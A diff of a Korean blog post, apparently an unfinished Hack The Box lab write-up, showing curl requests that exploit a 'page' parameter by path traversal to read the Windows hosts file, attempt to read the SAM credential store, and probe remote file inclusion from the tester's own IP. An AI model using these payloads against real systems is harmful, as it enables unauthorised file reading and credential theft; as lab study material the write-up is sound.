@@ -46,8 +46,57 @@ sudo vi /etc/hosts
 문제를 풀던 중 아래 문제의 답이 도저히 나오지 않아 결국 타 공략을 보았다. NT Lan Manager가 많이 나와 왜 글자 수가 다르지? 생각했지만, NT도 줄임말이여서 그런 것이였다...괜히 패배한 기분이다.
 ![](../assets/image_post/20240207175049.png)
 
+해당 사이트의 국가별 언어를 변경하면 아래 그림과 같이 page 파라미터에 인자를 받아온 것을 알 수 있다. 
+![](../assets/image_post/20240207233736.png)
+
+파일 명을 지정하고 있으므로 LFI와 RFI를 테스트해보았다. 지정한 경로는 문제에서 예시로 들어준 경로이다.
+``` bash
+ read-min 🎉   ~  curl http://unika.htb/index.php\?page\=../../../../../../../../windows/system32/drivers/etc/hosts
+
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+```
+주요 파일에 대해서도 접근이 되는지 테스트 해보았으나, "Permission denied"가 반환되는 것을 알 수 있다.
+``` bash
+ ⚡ read-min 🔑   ~  curl http://unika.htb/index.php\?page\=../../../../../../../../../../../../Windows/System32/config/SAM
+<br />
+<b>Warning</b>:  include(../../../../../../../../../../../../Windows/System32/config/SAM): Failed to open stream: Permission denied in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '../../../../../../../../../../../../Windows/System32/config/SAM' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+```
+<br/>
+
+아래는 RFI를 테스트한 결과이다. 아래의 결과처럼 존재하지 않는 파일에 대해선 "No such file"가 반환된다.
+``` bash
+ ⚡ read-min 🔑   ~  curl http://unika.htb/index.php\?page\=//10.10.14.6/somefile
+<br />
+<b>Warning</b>:  include(\\10.10.14.6\SOMEFILE): Failed to open stream: No such file or directory in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '//10.10.14.6/somefile' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
+```
 
 
 작성 중
 
-10.129.73.133
+10.129.225.86
+
+echo "10.129.225.86 unika.htb" | sudo tee -a /etc/hosts
